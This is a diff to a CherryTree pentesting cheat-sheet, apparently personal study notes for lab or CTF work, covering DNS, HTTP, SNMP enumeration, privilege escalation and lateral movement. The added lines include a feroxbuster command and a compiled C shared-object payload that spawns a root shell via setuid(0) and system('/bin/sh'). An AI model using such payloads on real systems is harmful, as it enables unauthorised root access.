@@ -121,7 +121,7 @@ More exploits: </rich_text>
 dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
           <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
         </node>
-        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1693325105">
+        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1693738904">
           <rich_text>We have to </rich_text>
           <rich_text weight="heavy">Dirbust</rich_text>
           <rich_text> and </rich_text>
@@ -145,7 +145,9 @@ Also we have to check:
           <rich_text style="italic">php</rich_text>
           <rich_text>, </rich_text>
           <rich_text style="italic">sql</rich_text>
-          <rich_text>)
+          <rich_text>) - </rich_text>
+          <rich_text weight="heavy">ferox -x php,html,txt</rich_text>
+          <rich_text>
 - we have to check recursive
 - check if git is present on the server
 - check page contents, maybe credentials or something helpful is already there
@@ -484,7 +486,7 @@ Also check this out: </rich_text>
           <codebox char_offset="216" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
         </node>
       </node>
-      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1692951137">
+      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1693738987">
         <rich_text weight="heavy">Things to consider</rich_text>
         <rich_text>
 - Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
@@ -560,14 +562,34 @@ Also check this out: </rich_text>
 ----------------------- FOOTHOLD PROBLEMS
 - Try </rich_text>
         <rich_text weight="heavy">bind shell</rich_text>
-        <rich_text> if reverse won't work</rich_text>
+        <rich_text> if reverse won't work
+
+</rich_text>
       </node>
     </node>
-    <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1692172590">
+    <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1693738982">
       <rich_text>We have to pay attention to </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.
+
+Good to know, </rich_text>
+      <rich_text style="italic">shell in C/C++</rich_text>
+      <rich_text>:
+
+
+Compile </rich_text>
+      <rich_text style="italic">SO file</rich_text>
+      <rich_text>: 
 </rich_text>
+      <codebox char_offset="141" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+void test_this()
+{
+	setuid(0); setgid(0); system("/bin/sh");
+}</codebox>
+      <codebox char_offset="162" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gcc -fPIC -shared test_this.c -o test_this.so</codebox>
       <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1693404538">
         <rich_text>Use:
 - linpeas
@@ -631,6 +653,7 @@ Check opened ports:
 
 Check running commands:
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
         <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
@@ -940,7 +963,7 @@ lsadump::sam</codebox>
           <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
         </node>
       </node>
-      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693404924">
+      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693404928">
         <rich_text>Try credentials using crackmapexec:
 </rich_text>
         <rich_text justification="left"></rich_text>
